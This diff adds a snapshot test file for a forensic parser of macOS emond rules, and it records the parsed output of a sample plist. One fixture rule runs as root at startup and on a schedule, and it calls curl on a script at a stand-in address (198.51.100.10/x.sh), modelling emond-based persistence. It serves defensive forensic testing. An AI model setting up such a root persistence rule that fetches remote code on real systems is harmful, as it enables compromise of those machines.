@@ -1,0 +1,7 @@
+---
+source: crates/nixcavate-artifacts/src/macos/emond.rs
+expression: "run(&ARTIFACT, \"private/etc/emond.d/rules/example.plist\", &data, 0)"
+---
+{"host":"memory","artifact":"emond","source_path":"private/etc/emond.d/rules/example.plist","source_line":1,"rule":"startup example","enabled":true,"event_types":["startup","periodic"],"action_type":"RunCommand","command":"/usr/bin/curl","arguments":["-s","http://198.51.100.10/x.sh"],"run_as":"root"}
+{"host":"memory","artifact":"emond","source_path":"private/etc/emond.d/rules/example.plist","source_line":1,"rule":"startup example","enabled":true,"event_types":["startup","periodic"],"action_type":"Log","command":null,"arguments":[],"run_as":null}
+{"host":"memory","artifact":"emond","source_path":"private/etc/emond.d/rules/example.plist","source_line":2,"rule":"disabled rule","enabled":false,"event_types":[],"action_type":"RunCommand","command":"/bin/true","arguments":[],"run_as":"501"}
